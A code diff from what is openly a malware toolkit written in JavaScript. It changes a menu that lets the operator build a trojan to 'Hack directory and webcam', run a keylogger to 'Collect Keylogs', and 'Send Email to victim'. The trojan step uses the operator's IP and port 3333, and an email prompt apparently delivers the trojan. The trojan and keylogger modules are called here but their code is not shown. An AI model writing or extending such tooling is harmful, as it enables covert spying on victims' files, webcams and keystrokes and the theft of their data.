@@ -17,25 +17,29 @@ const main = () => {
         type: "list",
         message: "Choose the action you wish to take",
         name: "action",
-        choices: ["Hack directory and webcam", "Collect Keylogs"],
+        choices: [
+          "Send Email to victim",
+          "Hack directory and webcam",
+          "Collect Keylogs",
+        ],
       },
     ])
     .then((answers) => {
-      let port = "3333";
-      getIp(deferred).then((ip) => {
-        const address = { ip, port };
-        console.log("   Using ip", ip);
-        console.log("   Using port", port);
-
-        if (answers.action === "Hack directory and webcam") {
+      if (answers.action === "Hack directory and webcam") {
+        let port = "3333";
+        getIp(deferred).then((ip) => {
+          const address = { ip, port };
+          console.log("   Using ip", ip);
+          console.log("   Using port", port);
           directoryHack.createTrojan(exec, Q, address).then(() => {
             emailPrompt(address);
           });
-        } else if (answers.action === "Collect Keylogs") {
-          keyLogger.hack(exec);
-          emailService.send(exec);
-        }
-      });
+        });
+      } else if (answers.action === "Collect Keylogs") {
+        keyLogger.hack(exec);
+      } else if (answers.action == "Send Email to victim") {
+        emailService.sendEmail();
+      }
     });
 };
 
